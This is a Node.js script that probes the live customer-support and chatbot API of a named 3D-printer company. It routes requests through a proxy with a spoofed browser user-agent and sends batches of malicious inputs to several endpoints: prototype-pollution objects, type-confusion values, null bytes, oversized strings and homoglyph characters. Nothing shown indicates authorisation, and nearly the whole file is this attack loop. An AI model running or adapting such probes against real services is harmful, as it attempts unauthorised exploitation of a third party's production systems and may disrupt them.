const {ProxyAgent,fetch}=require('undici');
const d=new ProxyAgent(process.env.HTTPS_PROXY||'http://127.0.0.1:7890');
const B='https://support.bambulab.com';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
function H(){return {'content-type':'application/json',origin:B,referer:B+'/liveChat','user-agent':UA,'x-robot-user':'probe-'+Math.random().toString(36).slice(2),'x-bbl-official-site-region':'EN'};}
async function post(path,body,label){try{const r=await fetch(B+path,{method:'POST',headers:H(),body:typeof body==='string'?body:JSON.stringify(body),dispatcher:d,signal:AbortSignal.timeout(15000)});const t=await r.text();console.log(r.status,label,'|',t.slice(0,220).replace(/\s+/g,' '));}catch(e){console.log('ERR',label,e.message)}}
(async()=>{
 const paths=['/gw/robot/front/order/query','/gw/robot/ticket/unclosed/list','/gw/robot/front/feedback','/gw/robot/front/report'];
 const payloads=[
  ['object-proto',{email:{'__proto__':{x:1}},orderNum:{'__proto__':{x:1}},phone:{'__proto__':{x:1}}}],
  ['constructor',{email:{constructor:{prototype:{x:1}}},orderNum:{constructor:{prototype:{x:1}}},phone:{constructor:{prototype:{x:1}}}}],
  ['array',{email:['a@example.com'],orderNum:['1'],phone:['1']}],
  ['number',{email:1,orderNum:1,phone:1}],
  ['null',{email:null,orderNum:null,phone:null}],
  ['bool',{email:true,orderNum:true,phone:true}],
  ['deep',{email:{a:{b:{c:{d:1}}}},orderNum:{a:{b:{c:{d:1}}}},phone:{a:{b:{c:{d:1}}}}}],
  ['long',{email:'a'.repeat(5000)+'@example.com',orderNum:'1'.repeat(5000),phone:'1'.repeat(5000)}],
  ['nullbyte',{email:'a@example.com\u0000x',orderNum:'1\u0000',phone:'1\u0000'}],
  ['unicode',{email:'а@example.com',orderNum:'１２３',phone:'１'}],
 ];
 for(const p of paths){console.log('###',p);for(const [label,body] of payloads){await post(p,body,label);} }
 console.log('### chat body type confusion');
 const chatPayloads=[
  ['uuid-object',{requestId:'clientID_text_x',history:[],chatbot:[],origin:1,cacheFlag:false,input:'hi',machineModel:'',sessionId:'x',uuid:{a:1}}],
  ['uuid-array',{requestId:'clientID_text_x',history:[],chatbot:[],origin:1,cacheFlag:false,input:'hi',machineModel:'',sessionId:'x',uuid:['a']}],
  ['uuid-number',{requestId:'clientID_text_x',history:[],chatbot:[],origin:1,cacheFlag:false,input:'hi',machineModel:'',sessionId:'x',uuid:123}],
  ['uuid-null',{requestId:'clientID_text_x',history:[],chatbot:[],origin:1,cacheFlag:false,input:'hi',machineModel:'',sessionId:'x',uuid:null}],
  ['uuid-empty',{requestId:'clientID_text_x',history:[],chatbot:[],origin:1,cacheFlag:false,input:'hi',machineModel:'',sessionId:'x',uuid:''}],
  ['requestId-object',{requestId:{a:1},history:[],chatbot:[],origin:1,cacheFlag:false,input:'hi',machineModel:'',sessionId:'x',uuid:'x'}],
  ['input-object',{requestId:'clientID_text_x',history:[],chatbot:[],origin:1,cacheFlag:false,input:{a:1},machineModel:'',sessionId:'x',uuid:'x'}],
  ['origin-string',{requestId:'clientID_text_x',history:[],chatbot:[],origin:'1',cacheFlag:'false',input:'hi',machineModel:'',sessionId:'x',uuid:'x'}],
 ];
 for(const [label,body] of chatPayloads){await post('/gw/robot/sse/chat',body,label);}
})();
